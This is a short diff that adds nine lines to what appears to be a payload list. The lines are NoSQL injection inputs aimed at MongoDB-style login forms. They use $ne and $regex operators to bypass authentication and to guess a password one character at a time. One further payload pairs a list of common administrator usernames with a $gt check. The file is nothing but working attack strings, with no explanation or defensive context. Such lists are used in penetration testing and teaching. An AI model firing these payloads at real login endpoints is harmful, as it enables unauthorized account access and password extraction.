@@ -1,0 +1,9 @@
+username[$ne]=toto&password[$regex]=m.{2}
+username[$ne]=toto&password[$regex]=md.{1}
+username[$ne]=toto&password[$regex]=mdp
+username[$ne]=toto&password[$regex]=m.*
+username[$ne]=toto&password[$regex]=md.*
+{"username":{"$eq":"admin"},"password":{"$regex":"^m"}}
+{"username":{"$eq":"admin"},"password":{"$regex":"^md"}}
+{"username":{"$eq":"admin"},"password":{"$regex":"^mdp"}}
+{"username":{"$in":["Admin","4dm1n","admin","root","administrator"]},"password":{"$gt":""}}
